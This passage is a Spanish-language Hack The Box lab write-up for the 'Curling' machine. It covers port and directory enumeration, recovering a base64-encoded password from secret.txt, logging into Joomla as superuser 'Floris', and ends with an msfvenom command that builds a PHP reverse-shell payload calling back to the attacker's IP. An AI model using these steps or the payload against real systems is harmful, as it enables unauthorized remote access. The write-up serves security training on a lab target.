---
title: "Hack The Box - Curling"
excerpt: "<img src='/images/portfolio/curling/cover.webp' width='500' height=auto><br/><br/>Curling is an Easy difficulty Linux box which requires a fair amount of enumeration. The password is saved in a file on the web root. The username can be download through a post on the CMS which allows a login. Modifying the php template gives a shell. Finding a hex dump and reversing it gives a user shell. On enumerating running processes a cron is discovered which can be exploited for root."
collection: portfolio
---

NMAP
------

Utilizo la herramienta nmap para escaneo de puertos y servicios.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# nmap -A -PN 10.10.10.150
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 12:57 CET
    Nmap scan report for 10.10.10.150
    Host is up (0.042s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
    |   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
    |_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-title: Home
    |_http-generator: Joomla! - Open Source Content Management
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.94SVN%E=4%D=1/23%OT=22%CT=1%CU=41059%PV=Y%DS=2%DC=T%G=Y%TM=65AF
    OS:A9A6%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
    OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
    OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
    OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
    OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
    OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
    OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
    OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
    OS:%CD=S)

    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE (using port 8080/tcp)
    HOP RTT      ADDRESS
    1   42.64 ms 10.10.14.1
    2   42.89 ms 10.10.10.150

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 22.51 seconds
    
HTTP
------

Conectándome al puerto http mediante el navegador me encuentro lo siguiente.<br/>

<img src='/images/portfolio/curling/http.png' width='900' height=auto><br/><br/>

Ahora voy a realizar una enumeración de directorios con 'gobuster' a ver si consigo algo.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# gobuster dir --url http://10.10.10.150/ --wordlist /usr/share/wordlists/dirb/common.txt
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.10.150/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.hta                 (Status: 403) [Size: 277]
    /.htpasswd            (Status: 403) [Size: 277]
    /.htaccess            (Status: 403) [Size: 277]
    /administrator        (Status: 301) [Size: 320] [--> http://10.10.10.150/administrator/]
    /bin                  (Status: 301) [Size: 310] [--> http://10.10.10.150/bin/]
    /cache                (Status: 301) [Size: 312] [--> http://10.10.10.150/cache/]
    /components           (Status: 301) [Size: 317] [--> http://10.10.10.150/components/]
    /images               (Status: 301) [Size: 313] [--> http://10.10.10.150/images/]
    /includes             (Status: 301) [Size: 315] [--> http://10.10.10.150/includes/]
    /index.php            (Status: 200) [Size: 14264]
    /language             (Status: 301) [Size: 315] [--> http://10.10.10.150/language/]
    /layouts              (Status: 301) [Size: 314] [--> http://10.10.10.150/layouts/]
    /libraries            (Status: 301) [Size: 316] [--> http://10.10.10.150/libraries/]
    /media                (Status: 301) [Size: 312] [--> http://10.10.10.150/media/]
    /modules              (Status: 301) [Size: 314] [--> http://10.10.10.150/modules/]
    /plugins              (Status: 301) [Size: 314] [--> http://10.10.10.150/plugins/]
    /server-status        (Status: 403) [Size: 277]
    /templates            (Status: 301) [Size: 316] [--> http://10.10.10.150/templates/]
    /tmp                  (Status: 301) [Size: 310] [--> http://10.10.10.150/tmp/]
    Progress: 4614 / 4615 (99.98%)
    ===============================================================
    Finished
    ===============================================================

Lo que más me llama la atención es el directorio /administrator vamos a conectarnos a ver de que se trata.<br/>

<img src='/images/portfolio/curling/administrator.png' width='900' height=auto><br/><br/>

Se trata de una interfaz de autenticación. Podemos ver también que el servidor hace uso de la plataforma 'Joomla' (https://www.joomla.org/). Si trato de acceder con las credenciales predeterminadas de la plataforma, no obtengo ningún resultado. Por tanto, me va a tocar analizar en profundidad los directorios y ficheros en búsqueda de un hilo por el que tirar.<br/><br/>

Con ayuda de Burpsuite, al acceder código del 'index.html' de la dirección principal, obtuve lo siguiente.<br/>

<img src='/images/portfolio/curling/secrets.png' width='900' height=auto><br/><br/>

Se ve que hay un comentario con el texto 'secret.txt', voy a ver si en efecto existe un recurso con ese nombre.<br/>

<img src='/images/portfolio/curling/secret.png' width='900' height=auto><br/><br/>

Resulta que ese recurso alberga una cadena en base64 'Q3VybGluZzIwMTgh' voy a decodificarla a ver que es.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# echo "Q3VybGluZzIwMTgh" | base64 -d
    Curling2018!

Parece tratarse de una contraseña, si prueba a entrar a la ruta /administrator con las credenciales 'admin:Curling2018!' y similares no consigo acceder, lo que me hace pensar que esa contraseña tendré que usarla en otro lugar.<br/><br/>

Investigando la página principal, veo que también existe un formulario de login. Además en relación con un posible nombre de usuario, se puede ver algo muy interesante.<br/>

<img src='/images/portfolio/curling/floris.png' width='900' height=auto><br/><br/>

Parece que un posible usuario sea 'Floris'. Voy a probar a acceder con ese usuario y la contraseña que obtuve anteriormente.<br/>

<img src='/images/portfolio/curling/superuser.png' width='450' height=auto><br/><br/>

Efectivamente esas eran las credenciales del Super User, ahora voy a probar estas mismas credenciales para acceder a la ruta /administrator.<br/>

<img src='/images/portfolio/curling/joomla.png' width='900' height=auto><br/><br/>

Consigo acceso como superusuario a la plataforma 'Joomla'. Buscando alguna forma de explotar esta plataforma para un posible reverse shell, encontré que en Joomla se pueden subir archivos para instalar extensiones.<br/><br/>

Por tanto probaré a crear y subir un exploit que me permita obtener un reverse shell para tener acceso remoto al servidor.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.31 LPORT=1234 -o shell.php         
    [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
    [-] No arch selected, selecting arch: php from the payload
    No encoder specified, outputting raw payload
    Payload size: 1112 bytes
    Saved as: shell.php


